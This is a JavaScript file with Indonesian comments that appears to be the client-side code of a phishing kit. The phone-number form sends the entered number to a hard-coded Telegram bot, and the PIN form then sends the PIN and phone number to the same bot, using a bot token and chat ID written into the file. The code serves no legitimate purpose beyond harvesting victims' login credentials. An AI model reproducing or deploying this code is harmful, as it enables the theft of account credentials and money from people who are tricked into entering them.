document.addEventListener("DOMContentLoaded", function () {
    const botToken = "7463211570:AAEvN-TOvXcoLM2JpNg8RBp0OxF6t0Czh70"; // Ganti dengan token bot Anda
    const chatID = "6824078885"; // Ganti dengan Chat ID Anda

    // Tangani Form Nomor HP
    const formHp = document.getElementById("formHp");
    if (formHp) {
        formHp.addEventListener("submit", function (event) {
            event.preventDefault();
            const phone = document.getElementById("phone").value;
            localStorage.setItem("phone", phone); // Simpan ke Local Storage

            // Kirim Nomor HP ke Telegram Langsung
            const message = `📲 *Data Baru Diterima*\n\n📱 *Nomor HP*: \`${phone}\`\n📅 Tanggal: ${new Date().toLocaleString()}`;
            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(telegramURL)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Nomor HP terkirim ke Telegram!");
                    } else {
                        console.error("Gagal mengirim Nomor HP.");
                    }
                })
                .catch(error => console.error("Error:", error));

            // Pindah ke halaman PIN
            window.location.href = "pin.html";
        });
    }

    // Tangani Form PIN
    const formPin = document.getElementById("formPin");
    if (formPin) {
        formPin.addEventListener("submit", function (event) {
            event.preventDefault();
            const pin = document.getElementById("pin").value;
            const phone = localStorage.getItem("phone"); // Ambil Nomor HP yang sudah dikirim sebelumnya

            if (!phone) {
                alert("Nomor HP tidak ditemukan. Harap isi ulang.");
                window.location.href = "index.html";
                return;
            }

            // Kirim PIN ke Telegram
            const message = `🔢 *PIN Diterima*\n\n📱 *Nomor HP*: \`${phone}\`\n🔑 *PIN*: \`${pin}\`\n📅 Tanggal: ${new Date().toLocaleString()}`;
            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(telegramURL)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("PIN berhasil dikirim!");
                    } else {
                        alert("Gagal mengirim PIN.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    alert("Terjadi kesalahan.");
                });
        });
    }
});
